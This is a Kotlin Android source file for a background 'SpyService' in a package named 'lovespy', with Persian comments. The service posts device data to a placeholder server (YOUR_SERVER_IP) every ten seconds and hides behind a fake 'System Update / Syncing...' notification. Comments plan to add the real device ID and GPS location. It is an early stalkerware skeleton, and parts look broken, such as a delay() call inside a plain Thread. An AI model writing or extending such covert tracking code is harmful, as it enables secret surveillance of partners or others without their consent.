package com.example.lovespy.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class SpyService : Service() {
    private val CHANNEL_ID = "SpyServiceChannel"
    private val NOTIFICATION_ID = 1
    
    // تنظیمات سرور (آدرس سروری که ساختی)
    private val SERVER_URL = "http://YOUR_SERVER_IP:3000" 

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())
        Log.d("SpyService", "Service Started")
        
        // شروع ارسال داده به سرور
        sendDataToServer()
    }

    private fun sendDataToServer() {
        Thread {
            while (true) {
                try {
                    delay(10000) // هر 10 ثانیه آپدیت بفرست
                    
                    val battery = getBatteryLevel()
                    val payload = JSONObject().apply {
                        put("deviceId", "DEVICE_001") // اینجا میشه ID واقعی گوشی رو گذاشت
                        put("battery", battery)
                        put("status", "online")
                        put("location", "null") // بعدا GPS رو اضافه میکنیم
                    }
                    
                    uploadData(payload.toString())
                    
                } catch (e: Exception) {
                    Log.e("SpyService", "Error sending data", e)
                }
            }
        }.start()
    }

    private fun getBatteryLevel(): Int {
        val intent = applicationContext.registerReceiver(null, 
            android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
        val level = intent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = intent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
        return if (level == -1 || scale == -1) -1 else ((level * 100.toLong()) / scale.toInt()).toInt()
    }

    private fun uploadData(jsonData: String) {
        val url = URL("$SERVER_URL/update")
        val connection = url.openConnection() as HttpURLConnection
        connection.requestMethod = "POST"
        connection.setRequestProperty("Content-Type", "application/json; utf-8")
        connection.doOutput = true
        
        connection.outputStream.write(jsonData.toByteArray())

        val responseCode = connection.responseCode
        if (responseCode == HttpURLConnection.HTTP_OK) {
            Log.d("SpyService", "Data uploaded successfully")
        } else {
            Log.e("SpyService", "Upload failed. Code: $responseCode")
        }
        connection.disconnect()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "Spy Service", NotificationManager.IMPORTANCE_LOW).apply {
                description = "Running in background"
            }
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val builder = Notification.Builder(this, CHANNEL_ID)
        builder.setContentTitle("System Update")
        builder.setContentText("Syncing...")
        builder.setSmallIcon(android.R.drawable.ic_menu_compass)
        return builder.build()
    }

    override fun onBind(p0: Intent?): IBinder? {
        return null
    }
}
